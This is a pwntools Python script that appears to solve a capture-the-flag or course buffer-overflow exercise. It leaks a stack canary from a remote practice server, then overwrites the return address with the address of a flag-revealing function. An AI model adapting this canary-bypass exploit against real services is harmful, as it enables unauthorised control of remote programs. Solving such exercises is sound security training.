import pwn

target = 'oblig1.bufferoverflow.no'
port = '7003'

buffer_to_canary_offset = b'24'
bufferfill = b'A' * int(buffer_to_canary_offset)
canary_to_return_p_offset = b'B' * 8 * 1
expose_flag_adr = pwn.p64(0x4011a7)

p = pwn.remote(target, port)

print(p.recvline())
p.sendline(buffer_to_canary_offset)

print(p.recvline())
read_canary = p.recvline()
print(b'Canary: ' + read_canary)

canary_val = pwn.p64(int(read_canary, 16))

payload = bufferfill + canary_val + canary_to_return_p_offset + expose_flag_adr

p.sendline(payload)

p.interactive()
p.close()